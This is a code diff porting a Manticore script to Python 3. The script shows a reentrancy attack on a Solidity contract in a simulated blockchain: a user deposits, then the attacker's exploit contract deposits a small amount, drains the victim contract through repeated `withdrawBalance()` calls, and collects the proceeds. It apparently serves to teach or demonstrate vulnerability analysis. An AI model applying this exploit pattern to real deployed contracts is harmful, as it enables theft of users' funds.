@@ -88,40 +88,40 @@ m.world.set_balance(contract_account, 1000000000000000000)  #give it some ether
 
 exploit_account = m.solidity_create_contract(exploit_source_code, owner=attacker_account)
 
-print "[+] Setup the exploit"
+print("[+] Setup the exploit")
 exploit_account.set_vulnerable_contract(contract_account)
 exploit_account.set_reentry_reps(2)
 
-print "[+] Setting attack string"
+print("[+] Setting attack string")
 #'\x9d\x15\xfd\x17'+pack_msb(32)+pack_msb(4)+'\x5f\xd8\xc7\x10',
 reentry_string = ABI.function_selector('withdrawBalance()')
 exploit_account.set_reentry_attack_string(reentry_string)
 
-print "[+] Initial world state"
-print " attacker_account %x balance: %d"% (attacker_account, m.get_balance(attacker_account))
-print " exploit_account %x balance: %d"%  (exploit_account, m.get_balance(exploit_account))
-print " user_account %x balance: %d"%  (user_account, m.get_balance(user_account))
-print " contract_account %x balance: %d"%  (contract_account, m.get_balance(contract_account))
+print("[+] Initial world state")
+print(" attacker_account %x balance: %d"% (attacker_account.address, m.get_balance(attacker_account.address)))
+print(" exploit_account %x balance: %d"%  (exploit_account.address, m.get_balance(exploit_account.address)))
+print(" user_account %x balance: %d"%  (user_account.address, m.get_balance(user_account.address)))
+print(" contract_account %x balance: %d"%  (contract_account.address, m.get_balance(contract_account.address)))
 
 
 #User deposits all in contract
-print "[+] user deposited some."
+print("[+] user deposited some.")
 contract_account.addToBalance(value=100000000000000000)
 
 
-print "[+] Let attacker deposit some small amount using exploit"
+print("[+] Let attacker deposit some small amount using exploit")
 exploit_account.proxycall(ABI.function_selector('addToBalance()'), value=100000000000000000)
 
-print "[+] Let attacker extract all using exploit" 
+print("[+] Let attacker extract all using exploit") 
 exploit_account.proxycall(ABI.function_selector('withdrawBalance()'))
 
-print "[+] Let attacker destroy the exploit andprofit" 
+print("[+] Let attacker destroy the exploit andprofit") 
 exploit_account.get_money() 
 
-print " attacker_account %x balance: %d"% (attacker_account, m.get_balance(attacker_account))
-print " user_account %x balance: %d"%  (user_account, m.get_balance(user_account))
-print " contract_account %x balance: %d"%  (contract_account, m.get_balance(contract_account))
+print(" attacker_account %x balance: %d"% (attacker_account.address, m.get_balance(attacker_account.address)))
+print(" user_account %x balance: %d"%  (user_account.address, m.get_balance(user_account.address)))
+print(" contract_account %x balance: %d"%  (contract_account.address, m.get_balance(contract_account.address)))
 
 m.finalize()
-print "[+] Look for results in %s"% m.workspace
+print("[+] Look for results in %s"% m.workspace)
 
